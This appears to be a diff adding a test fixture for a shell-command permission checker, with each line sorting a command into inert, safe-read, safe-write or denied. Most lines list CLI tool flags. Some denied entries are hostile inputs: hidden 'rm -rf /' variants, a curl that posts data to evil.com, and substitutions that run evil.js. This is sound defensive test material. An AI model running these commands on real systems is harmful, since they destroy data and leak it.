@@ -1,0 +1,747 @@
+! echo hello	inert
+! test -f foo	inert
+# comment\necho hello	inert
+# just a comment	inert
+$'\\x72\\x6d' -rf /	denied
+$'git' log	denied
+$(echo rm) -rf /	denied
+$(rm -rf /)	denied
+$cmd log	denied
+${cmd} log	denied
+((echo hello))	inert
+(echo a; echo b) | head -1	inert
+(echo a; rm -rf /)	denied
+(echo hello)	inert
+(echo hello) > /tmp/out.txt	safe-write
+(echo hello) | grep hello	inert
+(echo hello; echo world)	inert
+(echo hello; rm -rf /)	denied
+(for x in 1 2; do echo $x; done)	inert
+(ls && echo done)	inert
+(ls | grep foo)	inert
+(ls | rm -rf /)	denied
+(ls)	inert
+(ls) && echo done	inert
+(rm -rf /)	denied
+(x=1)	inert
+(x=1; ls)	inert
+./bin/rails db:migrate	safe-write
+./vendor/bin/pest --no-progress	safe-read
+./vendor/bin/phpstan analyse --no-progress	inert
+./vendor/bin/phpunit --testsuite Unit	safe-read
+:	inert
+: && echo hello	inert
+: --help	denied
+: --version	denied
+: > /dev/null	inert
+: foo bar	inert
+: x	inert
+@11ty/eleventy	safe-write
+@11ty/eleventy --config x	safe-write
+@11ty/eleventy --dryrun	safe-write
+@11ty/eleventy --dryrun --config x	safe-write
+@11ty/eleventy --dryrun --formats	safe-write
+@11ty/eleventy --dryrun x	safe-write
+@11ty/eleventy --formats	safe-write
+@11ty/eleventy --help	safe-write
+@11ty/eleventy --ignore-initial	safe-write
+@11ty/eleventy --incremental	safe-write
+@11ty/eleventy --input	safe-write
+@11ty/eleventy --input x	safe-write
+@11ty/eleventy --output	safe-write
+@11ty/eleventy --output x	safe-write
+@11ty/eleventy --pathprefix x	safe-write
+@11ty/eleventy --port x	safe-write
+@11ty/eleventy --quiet	safe-write
+@11ty/eleventy --running-as-server	safe-write
+@11ty/eleventy --to	safe-write
+@11ty/eleventy --to x	safe-write
+@11ty/eleventy --version	safe-write
+@11ty/eleventy --what x	safe-write
+@11ty/eleventy -h	safe-write
+@11ty/eleventy -q	safe-write
+@11ty/eleventy x	safe-write
+@apidevtools/swagger-cli	denied
+@apidevtools/swagger-cli --help	inert
+@apidevtools/swagger-cli --help --version	denied
+@apidevtools/swagger-cli --help x	denied
+@apidevtools/swagger-cli --version	inert
+@apidevtools/swagger-cli -V	inert
+@apidevtools/swagger-cli -h	inert
+@apidevtools/swagger-cli validate	denied
+@apidevtools/swagger-cli validate --help	safe-read
+@apidevtools/swagger-cli validate --help --no-schema	safe-read
+@apidevtools/swagger-cli validate --help x	safe-read
+@apidevtools/swagger-cli validate --no-schema	safe-read
+@apidevtools/swagger-cli validate --no-spec	safe-read
+@apidevtools/swagger-cli validate -h	safe-read
+@apidevtools/swagger-cli validate x	safe-read
+@apidevtools/swagger-cli x	denied
+@arethetypeswrong/cli	denied
+@arethetypeswrong/cli --config-path x	safe-read
+@arethetypeswrong/cli --entrypoints x	safe-read
+@arethetypeswrong/cli --entrypoints-legacy	safe-read
+@arethetypeswrong/cli --entrypoints-legacy --config-path x	safe-read
+@arethetypeswrong/cli --entrypoints-legacy --help	safe-read
+@arethetypeswrong/cli --entrypoints-legacy x	safe-read
+@arethetypeswrong/cli --exclude-entrypoints x	safe-read
+@arethetypeswrong/cli --format x	safe-read
+@arethetypeswrong/cli --from-npm x	safe-read
+@arethetypeswrong/cli --help	safe-read
+@arethetypeswrong/cli --include-entrypoints x	safe-read
+@arethetypeswrong/cli --no-emoji	safe-read
+@arethetypeswrong/cli --pack x	safe-read
+@arethetypeswrong/cli --quiet	safe-read
+@arethetypeswrong/cli --version	safe-read
+@arethetypeswrong/cli -f x	safe-read
+@arethetypeswrong/cli -h	safe-read
+@arethetypeswrong/cli -p x	safe-read
+@arethetypeswrong/cli -q	safe-read
+@arethetypeswrong/cli x	safe-read
+@astrojs/check	safe-read
+@astrojs/check --help	safe-read
+@astrojs/check --help --minimumFailingSeverity x	safe-read
+@astrojs/check --help --version	safe-read
+@astrojs/check --help x	safe-read
+@astrojs/check --minimumFailingSeverity x	safe-read
+@astrojs/check --minimumSeverity x	safe-read
+@astrojs/check --tsconfig x	safe-read
+@astrojs/check --version	safe-read
+@astrojs/check --watch	safe-read
+@astrojs/check -h	safe-read
+@astrojs/check x	safe-read
+@asyncapi/cli	denied
+@asyncapi/cli --help	inert
+@asyncapi/cli --help --version	denied
+@asyncapi/cli --help x	denied
+@asyncapi/cli --version	inert
+@asyncapi/cli -h	inert
+@asyncapi/cli diff	denied
+@asyncapi/cli diff --diagnostics-format x	safe-read
+@asyncapi/cli diff --fail-severity x	safe-read
+@asyncapi/cli diff --format x	safe-read
+@asyncapi/cli diff --help	safe-read
+@asyncapi/cli diff --help --diagnostics-format x	safe-read
+@asyncapi/cli diff --help --log-diagnostics	safe-read
+@asyncapi/cli diff --help x	safe-read
+@asyncapi/cli diff --log-diagnostics	safe-read
+@asyncapi/cli diff --no-log-diagnostics	safe-read
+@asyncapi/cli diff --type x	safe-read
+@asyncapi/cli diff -f x	safe-read
+@asyncapi/cli diff -h	safe-read
+@asyncapi/cli diff -t x	safe-read
+@asyncapi/cli diff x	safe-read
+@asyncapi/cli validate	denied
+@asyncapi/cli validate --diagnostics-format x	safe-read
+@asyncapi/cli validate --fail-severity x	safe-read
+@asyncapi/cli validate --help	safe-read
+@asyncapi/cli validate --help --diagnostics-format x	safe-read
+@asyncapi/cli validate --help --log-diagnostics	safe-read
+@asyncapi/cli validate --help x	safe-read
+@asyncapi/cli validate --log-diagnostics	safe-read
+@asyncapi/cli validate --no-log-diagnostics	safe-read
+@asyncapi/cli validate --proxyHost x	safe-read
+@asyncapi/cli validate --proxyPort x	safe-read
+@asyncapi/cli validate --score	safe-read
+@asyncapi/cli validate --suppressAllWarnings	safe-read
+@asyncapi/cli validate --suppressWarnings	safe-read
+@asyncapi/cli validate -h	safe-read
+@asyncapi/cli validate x	safe-read
+@asyncapi/cli x	denied
+@axe-core/cli	denied
+@axe-core/cli --browser x	safe-read
+@axe-core/cli --browser-arg x	safe-read
+@axe-core/cli --chromedriver-path x	safe-read
+@axe-core/cli --dir x	safe-read
+@axe-core/cli --disable x	safe-read
+@axe-core/cli --exclude x	safe-read
+@axe-core/cli --exit x	safe-read
+@axe-core/cli --help	safe-read
+@axe-core/cli --help --browser x	safe-read
+@axe-core/cli --help --no-color	safe-read
+@axe-core/cli --help x	safe-read
+@axe-core/cli --include x	safe-read
+@axe-core/cli --load-delay x	safe-read
+@axe-core/cli --no-color	safe-read
+@axe-core/cli --rules x	safe-read
+@axe-core/cli --tags x	safe-read
+@axe-core/cli --timeout x	safe-read
+@axe-core/cli --verbose	safe-read
+@axe-core/cli --version	safe-read
+@axe-core/cli -h	safe-read
+@axe-core/cli -v	safe-read
+@axe-core/cli x	safe-read
+@biomejs/biome	denied
+@biomejs/biome --help	inert
+@biomejs/biome --help --version	denied
+@biomejs/biome --help x	denied
+@biomejs/biome --version	inert
+@biomejs/biome -V	inert
+@biomejs/biome -h	inert
+@biomejs/biome check	safe-read
+@biomejs/biome check --colors	safe-read
+@biomejs/biome check --colors --config-path x	safe-read
+@biomejs/biome check --colors --help	safe-read
+@biomejs/biome check --colors x	safe-read
+@biomejs/biome check --config-path x	safe-read
+@biomejs/biome check --help	safe-read
+@biomejs/biome check --json-formatter	safe-read
+@biomejs/biome check --max-diagnostics x	safe-read
+@biomejs/biome check --no-errors-on-unmatched	safe-read
+@biomejs/biome check --quiet	safe-read
+@biomejs/biome check --stdin-file-path x	safe-read
+@biomejs/biome check --vcs-root x	safe-read
+@biomejs/biome check --verbose	safe-read
+@biomejs/biome check -h	safe-read
+@biomejs/biome check x	safe-read
+@biomejs/biome ci	safe-read
+@biomejs/biome ci --colors	safe-read
+@biomejs/biome ci --colors --config-path x	safe-read
+@biomejs/biome ci --colors --help	safe-read
+@biomejs/biome ci --colors x	safe-read
+@biomejs/biome ci --config-path x	safe-read
+@biomejs/biome ci --help	safe-read
+@biomejs/biome ci --json-formatter	safe-read
+@biomejs/biome ci --max-diagnostics x	safe-read
+@biomejs/biome ci --no-errors-on-unmatched	safe-read
+@biomejs/biome ci --quiet	safe-read
+@biomejs/biome ci --verbose	safe-read
+@biomejs/biome ci -h	safe-read
+@biomejs/biome ci x	safe-read
+@biomejs/biome format	inert
+@biomejs/biome format --colors	inert
+@biomejs/biome format --colors --config-path x	inert
+@biomejs/biome format --colors --help	inert
+@biomejs/biome format --colors x	inert
+@biomejs/biome format --config-path x	inert
+@biomejs/biome format --help	inert
+@biomejs/biome format --indent-style x	inert
+@biomejs/biome format --indent-width x	inert
+@biomejs/biome format --json-formatter	inert
+@biomejs/biome format --line-width x	inert
+@biomejs/biome format --no-errors-on-unmatched	inert
+@biomejs/biome format --quiet	inert
+@biomejs/biome format --stdin-file-path x	inert
+@biomejs/biome format --verbose	inert
+@biomejs/biome format -h	inert
+@biomejs/biome format x	inert
+@biomejs/biome lint	safe-read
+@biomejs/biome lint --colors	safe-read
+@biomejs/biome lint --colors --config-path x	safe-read
+@biomejs/biome lint --colors --help	safe-read
+@biomejs/biome lint --colors x	safe-read
+@biomejs/biome lint --config-path x	safe-read
+@biomejs/biome lint --help	safe-read
+@biomejs/biome lint --json-formatter	safe-read
+@biomejs/biome lint --max-diagnostics x	safe-read
+@biomejs/biome lint --no-errors-on-unmatched	safe-read
+@biomejs/biome lint --quiet	safe-read
+@biomejs/biome lint --stdin-file-path x	safe-read
+@biomejs/biome lint --vcs-root x	safe-read
+@biomejs/biome lint --verbose	safe-read
+@biomejs/biome lint -h	safe-read
+@biomejs/biome lint x	safe-read
+@biomejs/biome x	denied
+@changesets/cli	denied
+@changesets/cli --help	inert
+@changesets/cli --help --version	denied
+@changesets/cli --help x	denied
+@changesets/cli --version	inert
+@changesets/cli -h	inert
+@changesets/cli status	inert
+@changesets/cli status --help	inert
+@changesets/cli status --help --since x	inert
+@changesets/cli status --help --verbose	inert
+@changesets/cli status --help x	inert
+@changesets/cli status --since x	inert
+@changesets/cli status --verbose	inert
+@changesets/cli status -h	inert
+@changesets/cli status x	inert
+@changesets/cli x	denied
+@commitlint/cli	inert
+@commitlint/cli --color	inert
+@commitlint/cli --color --config x	inert
+@commitlint/cli --color --help	inert
+@commitlint/cli --color x	inert
+@commitlint/cli --config x	inert
+@commitlint/cli --cwd x	inert
+@commitlint/cli --edit x	inert
+@commitlint/cli --env x	inert
+@commitlint/cli --extends x	inert
+@commitlint/cli --from x	inert
+@commitlint/cli --help	inert
+@commitlint/cli --help-url	inert
+@commitlint/cli --no-color	inert
+@commitlint/cli --options x	inert
+@commitlint/cli --print-config	inert
+@commitlint/cli --quiet	inert
+@commitlint/cli --strict	inert
+@commitlint/cli --to x	inert
+@commitlint/cli --verbose	inert
+@commitlint/cli --version	inert
+@commitlint/cli -E x	inert
+@commitlint/cli -H x	inert
+@commitlint/cli -V	inert
+@commitlint/cli -d x	inert
+@commitlint/cli -e x	inert
+@commitlint/cli -f x	inert
+@commitlint/cli -g x	inert
+@commitlint/cli -h	inert
+@commitlint/cli -q	inert
+@commitlint/cli -s	inert
+@commitlint/cli -t x	inert
+@commitlint/cli -x x	inert
+@commitlint/cli x	inert
+@cucumber/cucumber	safe-read
+@cucumber/cucumber --backtrace x	safe-read
+@cucumber/cucumber --config x	safe-read
+@cucumber/cucumber --dry-run	safe-read
+@cucumber/cucumber --dry-run --backtrace x	safe-read
+@cucumber/cucumber --dry-run --exit	safe-read
+@cucumber/cucumber --dry-run x	safe-read
+@cucumber/cucumber --exit	safe-read
+@cucumber/cucumber --fail-fast	safe-read
+@cucumber/cucumber --force-exit	safe-read
+@cucumber/cucumber --format x	safe-read
+@cucumber/cucumber --format-options x	safe-read
+@cucumber/cucumber --help	safe-read
+@cucumber/cucumber --i18n-keywords x	safe-read
+@cucumber/cucumber --language x	safe-read
+@cucumber/cucumber --name x	safe-read
+@cucumber/cucumber --no-strict	safe-read
+@cucumber/cucumber --order x	safe-read
+@cucumber/cucumber --paths x	safe-read
+@cucumber/cucumber --profile	safe-read
+@cucumber/cucumber --publish	safe-read
+@cucumber/cucumber --publish-quiet	safe-read
+@cucumber/cucumber --require x	safe-read
+@cucumber/cucumber --require-module x	safe-read
+@cucumber/cucumber --retry x	safe-read
+@cucumber/cucumber --retry-tag-filter x	safe-read
+@cucumber/cucumber --strict	safe-read
+@cucumber/cucumber --tags x	safe-read
+@cucumber/cucumber --version	safe-read
+@cucumber/cucumber --world-parameters x	safe-read
+@cucumber/cucumber -V	safe-read
+@cucumber/cucumber -b x	safe-read
+@cucumber/cucumber -c x	safe-read
+@cucumber/cucumber -f x	safe-read
+@cucumber/cucumber -h	safe-read
+@cucumber/cucumber -i x	safe-read
+@cucumber/cucumber -n x	safe-read
+@cucumber/cucumber -p x	safe-read
+@cucumber/cucumber -r x	safe-read
+@cucumber/cucumber -t x	safe-read
+@cucumber/cucumber -w x	safe-read
+@cucumber/cucumber -x	safe-read
+@cucumber/cucumber x	safe-read
+@graphql-inspector/cli	denied
+@graphql-inspector/cli --help	inert
+@graphql-inspector/cli --help --version	denied
+@graphql-inspector/cli --help x	denied
+@graphql-inspector/cli --version	inert
+@graphql-inspector/cli -h	inert
+@graphql-inspector/cli coverage	denied
+@graphql-inspector/cli coverage --header x	inert
+@graphql-inspector/cli coverage --help	inert
+@graphql-inspector/cli coverage --help --header x	inert
+@graphql-inspector/cli coverage --help -h	inert
+@graphql-inspector/cli coverage --help x	inert
+@graphql-inspector/cli coverage --require x	inert
+@graphql-inspector/cli coverage --silent x	inert
+@graphql-inspector/cli coverage --token x	inert
+@graphql-inspector/cli coverage -h	inert
+@graphql-inspector/cli coverage -r x	inert
+@graphql-inspector/cli coverage -t x	inert
+@graphql-inspector/cli coverage x	inert
+@graphql-inspector/cli diff	denied
+@graphql-inspector/cli diff --header x	inert
+@graphql-inspector/cli diff --help	inert
+@graphql-inspector/cli diff --help --header x	inert
+@graphql-inspector/cli diff --help -h	inert
+@graphql-inspector/cli diff --help x	inert
+@graphql-inspector/cli diff --left-header x	inert
+@graphql-inspector/cli diff --require x	inert
+@graphql-inspector/cli diff --right-header x	inert
+@graphql-inspector/cli diff --rule x	inert
+@graphql-inspector/cli diff --token x	inert
+@graphql-inspector/cli diff -h	inert
+@graphql-inspector/cli diff -r x	inert
+@graphql-inspector/cli diff -t x	inert
+@graphql-inspector/cli diff x	inert
+@graphql-inspector/cli introspect	denied
+@graphql-inspector/cli introspect --header x	inert
+@graphql-inspector/cli introspect --help	inert
+@graphql-inspector/cli introspect --help --header x	inert
+@graphql-inspector/cli introspect --help -h	inert
+@graphql-inspector/cli introspect --help x	inert
+@graphql-inspector/cli introspect --require x	inert
+@graphql-inspector/cli introspect --token x	inert
+@graphql-inspector/cli introspect -h	inert
+@graphql-inspector/cli introspect -r x	inert
+@graphql-inspector/cli introspect -t x	inert
+@graphql-inspector/cli introspect x	inert
+@graphql-inspector/cli similar	denied
+@graphql-inspector/cli similar --header x	inert
+@graphql-inspector/cli similar --help	inert
+@graphql-inspector/cli similar --help --header x	inert
+@graphql-inspector/cli similar --help -h	inert
+@graphql-inspector/cli similar --help x	inert
+@graphql-inspector/cli similar --require x	inert
+@graphql-inspector/cli similar --threshold x	inert
+@graphql-inspector/cli similar --token x	inert
+@graphql-inspector/cli similar -h	inert
+@graphql-inspector/cli similar -n x	inert
+@graphql-inspector/cli similar -r x	inert
+@graphql-inspector/cli similar -t x	inert
+@graphql-inspector/cli similar x	inert
+@graphql-inspector/cli validate	denied
+@graphql-inspector/cli validate --apollo	safe-read
+@graphql-inspector/cli validate --apollo --deprecated	safe-read
+@graphql-inspector/cli validate --apollo --header x	safe-read
+@graphql-inspector/cli validate --apollo x	safe-read
+@graphql-inspector/cli validate --deprecated	safe-read
+@graphql-inspector/cli validate --header x	safe-read
+@graphql-inspector/cli validate --help	safe-read
+@graphql-inspector/cli validate --noStrictFragments	safe-read
+@graphql-inspector/cli validate --require x	safe-read
+@graphql-inspector/cli validate --token x	safe-read
+@graphql-inspector/cli validate -h	safe-read
+@graphql-inspector/cli validate -r x	safe-read
+@graphql-inspector/cli validate -t x	safe-read
+@graphql-inspector/cli validate x	safe-read
+@graphql-inspector/cli x	denied
+@herb-tools/linter	denied
+@herb-tools/linter --config-file x	safe-read
+@herb-tools/linter --disable-failing	safe-read
+@herb-tools/linter --disable-failing --config-file x	safe-read
+@herb-tools/linter --disable-failing --force	safe-read
+@herb-tools/linter --disable-failing x	safe-read
+@herb-tools/linter --fail-level x	safe-read
+@herb-tools/linter --force	safe-read
+@herb-tools/linter --format x	safe-read
+@herb-tools/linter --github	safe-read
+@herb-tools/linter --help	safe-read
+@herb-tools/linter --ignore-disable-comments	safe-read
+@herb-tools/linter --jobs x	safe-read
+@herb-tools/linter --json	safe-read
+@herb-tools/linter --no-color	safe-read
+@herb-tools/linter --no-custom-rules	safe-read
+@herb-tools/linter --no-github	safe-read
+@herb-tools/linter --no-timing	safe-read
+@herb-tools/linter --no-wrap-lines	safe-read
+@herb-tools/linter --simple	safe-read
+@herb-tools/linter --theme x	safe-read
+@herb-tools/linter --truncate-lines	safe-read
+@herb-tools/linter --version	safe-read
+@herb-tools/linter -c x	safe-read
+@herb-tools/linter -h	safe-read
+@herb-tools/linter -j x	safe-read
+@herb-tools/linter -v	safe-read
+@herb-tools/linter x	safe-read
+@htmlhint/htmlhint	denied
+@htmlhint/htmlhint --config x	safe-read
+@htmlhint/htmlhint --format x	safe-read
+@htmlhint/htmlhint --help	safe-read
+@htmlhint/htmlhint --help --config x	safe-read
+@htmlhint/htmlhint --help --list	safe-read
+@htmlhint/htmlhint --help x	safe-read
+@htmlhint/htmlhint --ignore x	safe-read
+@htmlhint/htmlhint --list	safe-read
+@htmlhint/htmlhint --nocolor	safe-read
+@htmlhint/htmlhint --rules x	safe-read
+@htmlhint/htmlhint --rulesdir x	safe-read
+@htmlhint/htmlhint --version	safe-read
+@htmlhint/htmlhint --warn	safe-read
+@htmlhint/htmlhint -R x	safe-read
+@htmlhint/htmlhint -V	safe-read
+@htmlhint/htmlhint -c x	safe-read
+@htmlhint/htmlhint -f x	safe-read
+@htmlhint/htmlhint -h	safe-read
+@htmlhint/htmlhint -i x	safe-read
+@htmlhint/htmlhint -l	safe-read
+@htmlhint/htmlhint -r x	safe-read
+@htmlhint/htmlhint x	safe-read
+@ibm/openapi-validator	denied
+@ibm/openapi-validator --config x	safe-read
+@ibm/openapi-validator --help	safe-read
+@ibm/openapi-validator --help --config x	safe-read
+@ibm/openapi-validator --help --impact-score	safe-read
+@ibm/openapi-validator --help x	safe-read
+@ibm/openapi-validator --impact-score	safe-read
+@ibm/openapi-validator --json	safe-read
+@ibm/openapi-validator --log-level x	safe-read
+@ibm/openapi-validator --no-colors	safe-read
+@ibm/openapi-validator --ruleset x	safe-read
+@ibm/openapi-validator --summary-only	safe-read
+@ibm/openapi-validator --version	safe-read
+@ibm/openapi-validator --warnings-limit x	safe-read
+@ibm/openapi-validator -V	safe-read
+@ibm/openapi-validator -c x	safe-read
+@ibm/openapi-validator -h	safe-read
+@ibm/openapi-validator -j	safe-read
+@ibm/openapi-validator -l x	safe-read
+@ibm/openapi-validator -n	safe-read
+@ibm/openapi-validator -q	safe-read
+@ibm/openapi-validator -r x	safe-read
+@ibm/openapi-validator -s	safe-read
+@ibm/openapi-validator -w x	safe-read
+@ibm/openapi-validator x	safe-read
+@johnnymorganz/stylua-bin	denied
+@johnnymorganz/stylua-bin --allow-hidden	denied
+@johnnymorganz/stylua-bin --allow-hidden --check	inert
+@johnnymorganz/stylua-bin --allow-hidden --config-path x	denied
+@johnnymorganz/stylua-bin --allow-hidden x	denied
+@johnnymorganz/stylua-bin --check	inert
+@johnnymorganz/stylua-bin --check --allow-hidden	inert
+@johnnymorganz/stylua-bin --check --check	inert
+@johnnymorganz/stylua-bin --check --color	inert
+@johnnymorganz/stylua-bin --check --config-path x	inert
+@johnnymorganz/stylua-bin --check --glob x	inert
+@johnnymorganz/stylua-bin --check --help	inert
+@johnnymorganz/stylua-bin --check --no-editorconfig	inert
+@johnnymorganz/stylua-bin --check --num-threads x	inert
+@johnnymorganz/stylua-bin --check --output-format x	inert
+@johnnymorganz/stylua-bin --check --respect-ignores	inert
+@johnnymorganz/stylua-bin --check --search-parent-directories x	inert
+@johnnymorganz/stylua-bin --check --verbose	inert
+@johnnymorganz/stylua-bin --check --verify	inert
+@johnnymorganz/stylua-bin --check --version	inert
+@johnnymorganz/stylua-bin --check -V	inert
+@johnnymorganz/stylua-bin --check -f x	inert
+@johnnymorganz/stylua-bin --check -g x	inert
+@johnnymorganz/stylua-bin --check -h	inert
+@johnnymorganz/stylua-bin --color	denied
+@johnnymorganz/stylua-bin --config-path x	denied
+@johnnymorganz/stylua-bin --glob x	denied
+@johnnymorganz/stylua-bin --help	inert
+@johnnymorganz/stylua-bin --no-editorconfig	denied
+@johnnymorganz/stylua-bin --num-threads x	denied
+@johnnymorganz/stylua-bin --output-format x	denied
+@johnnymorganz/stylua-bin --respect-ignores	denied
+@johnnymorganz/stylua-bin --search-parent-directories x	denied
+@johnnymorganz/stylua-bin --verbose	denied
+@johnnymorganz/stylua-bin --verify	inert
+@johnnymorganz/stylua-bin --version	denied
+@johnnymorganz/stylua-bin -V	denied
+@johnnymorganz/stylua-bin -f x	denied
+@johnnymorganz/stylua-bin -g x	denied
+@johnnymorganz/stylua-bin -h	inert
+@johnnymorganz/stylua-bin x	denied
+@ls-lint/ls-lint	inert
+@ls-lint/ls-lint --config x	inert
+@ls-lint/ls-lint --debug	inert
+@ls-lint/ls-lint --debug --config x	inert
+@ls-lint/ls-lint --debug --version	inert
+@ls-lint/ls-lint --debug x	inert
+@ls-lint/ls-lint --error-output-format x	inert
+@ls-lint/ls-lint --help	denied
+@ls-lint/ls-lint --version	inert
+@ls-lint/ls-lint --warn	inert
+@ls-lint/ls-lint --workdir x	inert
+@ls-lint/ls-lint x	inert
+@manypkg/cli	denied
+@manypkg/cli --help	inert
+@manypkg/cli --help --version	denied
+@manypkg/cli --help x	denied
+@manypkg/cli --version	inert
+@manypkg/cli -h	inert
+@manypkg/cli check	inert
+@manypkg/cli check --help	inert
+@manypkg/cli check --help -h	inert
+@manypkg/cli check --help x	inert
+@manypkg/cli check -h	inert
+@manypkg/cli check x	inert
+@manypkg/cli x	denied
+@microsoft/api-extractor	denied
+@microsoft/api-extractor --help	inert
+@microsoft/api-extractor --help --version	denied
+@microsoft/api-extractor --help x	denied
+@microsoft/api-extractor --version	inert
+@microsoft/api-extractor -h	inert
+@microsoft/api-extractor run	safe-read
+@microsoft/api-extractor run --config x	safe-read
+@microsoft/api-extractor run --diagnostics	safe-read
+@microsoft/api-extractor run --diagnostics --config x	safe-read
+@microsoft/api-extractor run --diagnostics --help	safe-read
+@microsoft/api-extractor run --diagnostics x	safe-read
+@microsoft/api-extractor run --help	safe-read
+@microsoft/api-extractor run --local	safe-read
+@microsoft/api-extractor run --typescript-compiler-folder x	safe-read
+@microsoft/api-extractor run --verbose	safe-read
+@microsoft/api-extractor run -c x	safe-read
+@microsoft/api-extractor run -h	safe-read
+@microsoft/api-extractor run -l	safe-read
+@microsoft/api-extractor run -v	safe-read
+@microsoft/api-extractor run x	safe-read
+@microsoft/api-extractor x	denied
+@openapitools/openapi-generator-cli	denied
+@openapitools/openapi-generator-cli --help	inert
+@openapitools/openapi-generator-cli --help --version	denied
+@openapitools/openapi-generator-cli --help x	denied
+@openapitools/openapi-generator-cli --version	inert
+@openapitools/openapi-generator-cli -h	inert
+@openapitools/openapi-generator-cli validate	denied
+@openapitools/openapi-generator-cli validate --auth x	safe-read
+@openapitools/openapi-generator-cli validate --help	safe-read
+@openapitools/openapi-generator-cli validate --help --auth x	safe-read
+@openapitools/openapi-generator-cli validate --help --recommend	safe-read
+@openapitools/openapi-generator-cli validate --help x	safe-read
+@openapitools/openapi-generator-cli validate --input-spec x	safe-read
+@openapitools/openapi-generator-cli validate --recommend	safe-read
+@openapitools/openapi-generator-cli validate -a x	safe-read
+@openapitools/openapi-generator-cli validate -h	safe-read
+@openapitools/openapi-generator-cli validate -i x	safe-read
+@openapitools/openapi-generator-cli validate x	safe-read
+@openapitools/openapi-generator-cli x	denied
+@redocly/cli	denied
+@redocly/cli --help	inert
+@redocly/cli --help --version	denied
+@redocly/cli --help x	denied
+@redocly/cli --version	inert
+@redocly/cli -h	inert
+@redocly/cli check-config	inert
+@redocly/cli check-config --config x	inert
+@redocly/cli check-config --help	inert
+@redocly/cli check-config --help --config x	inert
+@redocly/cli check-config --help -h	inert
+@redocly/cli check-config --help x	inert
+@redocly/cli check-config -h	inert
+@redocly/cli check-config x	inert
+@redocly/cli lint	safe-read
+@redocly/cli lint --config x	safe-read
+@redocly/cli lint --extends x	safe-read
+@redocly/cli lint --format x	safe-read
+@redocly/cli lint --help	safe-read
+@redocly/cli lint --help --config x	safe-read
+@redocly/cli lint --help --version	safe-read
+@redocly/cli lint --help x	safe-read
+@redocly/cli lint --max-problems x	safe-read
+@redocly/cli lint --skip-rule x	safe-read
+@redocly/cli lint --version	safe-read
+@redocly/cli lint -h	safe-read
+@redocly/cli lint x	safe-read
+@redocly/cli stats	inert
+@redocly/cli stats --config x	inert
+@redocly/cli stats --help	inert
+@redocly/cli stats --help --config x	inert
+@redocly/cli stats --help -h	inert
+@redocly/cli stats --help x	inert
+@redocly/cli stats -h	inert
+@redocly/cli stats x	inert
+@redocly/cli x	denied
+@shopify/theme-check	safe-read
+@shopify/theme-check --config x	safe-read
+@shopify/theme-check --fail-level x	safe-read
+@shopify/theme-check --help	safe-read
+@shopify/theme-check --help --config x	safe-read
+@shopify/theme-check --help --list	safe-read
+@shopify/theme-check --help x	safe-read
+@shopify/theme-check --list	safe-read
+@shopify/theme-check --no-color	safe-read
+@shopify/theme-check --output x	safe-read
+@shopify/theme-check --path x	safe-read
+@shopify/theme-check --verbose	safe-read
+@shopify/theme-check --version	safe-read
+@shopify/theme-check -C x	safe-read
+@shopify/theme-check -h	safe-read
+@shopify/theme-check -o x	safe-read
+@shopify/theme-check x	safe-read
+@stoplight/spectral-cli	denied
+@stoplight/spectral-cli --help	inert
+@stoplight/spectral-cli --help --version	denied
+@stoplight/spectral-cli --help x	denied
+@stoplight/spectral-cli --version	inert
+@stoplight/spectral-cli -V	inert
+@stoplight/spectral-cli -h	inert
+@stoplight/spectral-cli lint	denied
+@stoplight/spectral-cli lint --display-only-failures	safe-read
+@stoplight/spectral-cli lint --display-only-failures --encoding x	safe-read
+@stoplight/spectral-cli lint --display-only-failures --help	safe-read
+@stoplight/spectral-cli lint --display-only-failures x	safe-read
+@stoplight/spectral-cli lint --encoding x	safe-read
+@stoplight/spectral-cli lint --fail-severity x	safe-read
+@stoplight/spectral-cli lint --format x	safe-read
+@stoplight/spectral-cli lint --help	safe-read
+@stoplight/spectral-cli lint --quiet	safe-read
+@stoplight/spectral-cli lint --resolver x	safe-read
+@stoplight/spectral-cli lint --ruleset x	safe-read
+@stoplight/spectral-cli lint --stdin-filepath x	safe-read
+@stoplight/spectral-cli lint --verbose	safe-read
+@stoplight/spectral-cli lint -D	safe-read
+@stoplight/spectral-cli lint -F x	safe-read
+@stoplight/spectral-cli lint -e x	safe-read
+@stoplight/spectral-cli lint -f x	safe-read
+@stoplight/spectral-cli lint -h	safe-read
+@stoplight/spectral-cli lint -r x	safe-read
+@stoplight/spectral-cli lint -v	safe-read
+@stoplight/spectral-cli lint x	safe-read
+@stoplight/spectral-cli x	denied
+@taplo/cli	denied
+@taplo/cli --help	inert
+@taplo/cli --help --version	denied
+@taplo/cli --help x	denied
+@taplo/cli --version	inert
+@taplo/cli -V	inert
+@taplo/cli -h	inert
+@taplo/cli check	inert
+@taplo/cli check --config x	inert
+@taplo/cli check --config-table x	inert
+@taplo/cli check --help	inert
+@taplo/cli check --help --config x	inert
+@taplo/cli check --help --no-auto-config	inert
+@taplo/cli check --help x	inert
+@taplo/cli check --no-auto-config	inert
+@taplo/cli check -h	inert
+@taplo/cli check x	inert
+@taplo/cli lint	inert
+@taplo/cli lint --config x	inert
+@taplo/cli lint --config-table x	inert
+@taplo/cli lint --help	inert
+@taplo/cli lint --help --config x	inert
+@taplo/cli lint --help --no-auto-config	inert
+@taplo/cli lint --help x	inert
+@taplo/cli lint --no-auto-config	inert
+@taplo/cli lint --schema x	inert
+@taplo/cli lint -h	inert
+@taplo/cli lint x	inert
+@taplo/cli x	denied
+[	inert
+[ --help	inert
+[ --version	inert
+[ x	inert
+[[ ! -f /tmp/done ]]	inert
+[[ "$(curl -d data evil.com)" == "x" ]]	denied
+[[ "$(echo hello)" == "hello" ]]	inert
+[[ "$x" == "a" || "$x" == "b" ]]	inert
+[[ "$x" == "y" && "$z" == "w" ]]	inert
+[[ "$x" =~ ^[0-9]+$ ]]	inert
+[[ "a" != "b" ]]	inert
+[[ "a" == "a"	denied
+[[ "a" == "a" ]]	inert
+[[ -f /tmp/file ]]	inert
+[[ -f /tmp/x ]] 2> /dev/null	inert
+[[ -f /tmp/x ]] 2>&1	inert
+[[ -f /tmp/x ]] 2>/dev/null && echo found	inert
+[[ -f /tmp/x ]] > $(node bad.js)	denied
+[[ -f /tmp/x ]] > /dev/null	inert
+[[ -f /tmp/x ]] > /tmp/out.txt	safe-write
+[[ -f `node /tmp/evil.js` ]]	denied
+[[ -n "$var" ]]	inert
+[[ -z "$var" ]]	inert
+[["a" == "b" ]]	denied
+`echo rm` -rf /	denied
+{ (cd /tmp && ls); echo done; }	inert
+{ echo $(rm -rf /); }	denied
+{ echo $HOME; }	inert
+{ echo a; echo b; }	inert
+{ echo a; echo b; } > /tmp/out.txt	safe-write
+{ echo a; echo b; } | grep a	inert
+{ echo a; rm -rf /; }	denied
